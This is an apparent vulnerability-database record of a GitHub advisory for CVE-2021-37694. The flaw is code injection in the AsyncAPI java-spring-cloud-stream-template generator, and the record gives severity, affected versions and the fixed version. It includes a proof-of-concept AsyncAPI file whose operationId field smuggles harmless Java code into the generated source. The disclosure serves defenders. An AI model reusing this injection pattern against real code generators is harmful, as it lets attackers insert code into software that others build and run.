advisory_id: GHSA-xj6r-2jpm-qvxp
datasource_id: github_osv_importer_v2/GHSA-xj6r-2jpm-qvxp
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/08/GHSA-xj6r-2jpm-qvxp/GHSA-xj6r-2jpm-qvxp.json
aliases:
  - CVE-2021-37694
summary: "Code injection issue for java-spring-cloud-stream-template\nThe following was initially\
  \ reported by @jonaslagoni:\n\nGiven the following command:\n`ag ./dummy.json @asyncapi/java-spring-cloud-stream-template\
  \ --force-write --output ./output`\n\nWith the following AsyncAPI document:\n```json\n{\n\
  \  \"asyncapi\": \"2.0.0\",\n  \"info\": {\n    \"title\": \"Streetlight\",\n    \"version\"\
  : \"1.0.0\"\n  },\n  \"defaultContentType\": \"json\",\n  \"channels\": {\n    \"security/audit/channel\"\
  : {\n      \"description\": \"Channel for the turn on command which should turn on the streetlight\"\
  ,\n      \"parameters\": {\n        \"streetlight_id\": {\n          \"description\": \"The\
  \ ID of the streetlight\",\n          \"schema\": {\n            \"type\": \"string\"\n  \
  \        }\n        }\n      },\n      \"publish\": {\n        \"operationId\": \"test() {\
  \ System.out.println(\\\"injected\\\"); return test(0); }\\n public Consumer<CustomClass>\
  \ someothername\",\n        \"message\": {\n          \"name\": \"TurnonCommand\",\n     \
  \     \"payload\": {\n            \"$ref\": \"#/components/schemas/CustomClass\"\n       \
  \   }\n        }\n      }\n    }\n  },\n  \"components\": {\n    \"schemas\" : {\n      \"\
  CustomClass\": {\n        \"type\": \"object\",\n        \"properties\": {\n          \"prop\"\
  : { \n              \"type\": \"string\"\n          }\n        }\n      }\n    }\n  }\n}\n\
  ```\n\nWhich changes the following output: \n\n```java\n...\n  @Bean\n  public Consumer<CustomClass>\
  \ test() {\n    // Add business logic here.\n    return null;\n  }\n...\n```\nTo\n```java\n\
  ...\n  @Bean\n  public Consumer<CustomClass> test() { System.out.println(\"injected\"); return\
  \ someothername(); }\n  public Consumer<CustomClass> someothername() {\n    // Add business\
  \ logic here.\n    return null;\n  }\n...\n```"
impacted_packages:
  - purl: pkg:npm/%40asyncapi/java-spring-cloud-stream-template
    affected_versions: vers:npm/<=0.6.9
    fixed_versions: vers:npm/0.7.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '8.7'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/08/GHSA-xj6r-2jpm-qvxp/GHSA-xj6r-2jpm-qvxp.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-94
references:
  - url: https://github.com/asyncapi/java-spring-cloud-stream-template
    reference_type:
    reference_id:
  - url: https://github.com/asyncapi/java-spring-cloud-stream-template/security/advisories/GHSA-xj6r-2jpm-qvxp
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2021-37694
    reference_type:
    reference_id: CVE-2021-37694
